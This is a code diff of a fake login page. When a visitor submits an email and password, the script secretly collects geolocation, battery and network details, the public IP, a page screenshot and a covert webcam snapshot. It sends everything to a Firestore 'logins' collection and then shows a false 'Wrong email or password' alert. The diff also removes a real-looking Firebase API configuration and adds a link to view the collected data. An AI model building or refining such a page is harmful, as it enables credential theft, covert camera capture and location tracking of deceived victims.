@@ -15,6 +15,9 @@
         button:hover { background: #1557b0; }
         video, canvas { display: none; }
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js"></script>
 </head>
 <body>
     <div class="login-box">
@@ -26,30 +29,23 @@
             <input type="password" id="password" placeholder="Enter your password" required>
             <button type="submit">Next</button>
         </form>
+        <p><a href="data.html">View Collected Data</a></p>
     </div>
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
-
-    <!-- Firebase scripts (using ES module syntax) -->
-    <script type="module">
-        // Import the required functions from Firebase SDK
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";
-
-        // Your Firebase config object
+    <script>
+        // Replace this with your own firebaseConfig from your Firebase project
         const firebaseConfig = {
-            apiKey: "AIzaSyAtRqJeS7UaxHHVRwZ3ov-8jXVToVvGuKg",
-            authDomain: "tracking-d2d42.firebaseapp.com",
-            projectId: "tracking-d2d42",
-            storageBucket: "tracking-d2d42.firebasestorage.app",
-            messagingSenderId: "411030031665",
-            appId: "1:411030031665:web:b79f56ad363c8a7b6d3410",
-            measurementId: "G-QB5KNP29EJ"
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+            projectId: "YOUR_PROJECT_ID",
+            storageBucket: "YOUR_PROJECT_ID.firebasestorage.app",
+            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+            appId: "YOUR_APP_ID",
+            measurementId: "YOUR_MEASUREMENT_ID"
         };
-
-        // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+        const app = firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
 
         document.getElementById('loginForm').onsubmit = async function(e) {
             e.preventDefault();
@@ -83,18 +79,24 @@
                     accuracy: position.coords.accuracy
                 };
             } catch (error) {
+                console.error('Geolocation error:', error.message);
                 geolocation = { error: 'Geolocation denied or unavailable' };
             }
 
             let battery = {};
             if (navigator.getBattery) {
-                const bat = await navigator.getBattery();
-                battery = {
-                    charging: bat.charging,
-                    level: bat.level * 100 + '%',
-                    chargingTime: bat.chargingTime || 'N/A',
-                    dischargingTime: bat.dischargingTime || 'N/A'
-                };
+                try {
+                    const bat = await navigator.getBattery();
+                    battery = {
+                        charging: bat.charging,
+                        level: bat.level * 100 + '%',
+                        chargingTime: bat.chargingTime || 'N/A',
+                        dischargingTime: bat.dischargingTime || 'N/A'
+                    };
+                } catch (error) {
+                    console.error('Battery error:', error.message);
+                    battery = { error: 'Battery info unavailable' };
+                }
             }
 
             const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
@@ -111,7 +113,7 @@
                 const data = await response.json();
                 ip = data.ip;
             } catch (error) {
-                console.error('IP fetch failed:', error);
+                console.error('IP fetch failed:', error.message);
             }
 
             let screenshot = '';
@@ -119,7 +121,7 @@
                 const canvas = await html2canvas(document.body);
                 screenshot = canvas.toDataURL('image/png');
             } catch (error) {
-                console.error('Screenshot failed:', error);
+                console.error('Screenshot failed:', error.message);
                 screenshot = 'N/A';
             }
 
@@ -136,7 +138,7 @@
                 cameraShot = canvas.toDataURL('image/png');
                 stream.getTracks().forEach(track => track.stop());
             } catch (error) {
-                console.error('Camera shot failed:', error);
+                console.error('Camera shot failed:', error.message);
                 cameraShot = 'N/A';
             }
 
@@ -155,12 +157,12 @@
             console.log('Sending:', payload);
 
             try {
-                // Add data to Firestore collection 'logins'
-                await addDoc(collection(db, "logins"), payload);
-                console.log('Data saved to Firestore');
+                await db.collection('logins').add(payload);
+                console.log('Data successfully saved to Firestore');
                 alert('Wrong email or password');
             } catch (error) {
-                console.error('Firestore error:', error);
+                console.error('Firestore error:', error.message);
+                alert('Failed to save data: ' + error.message);
             }
         };
     </script>
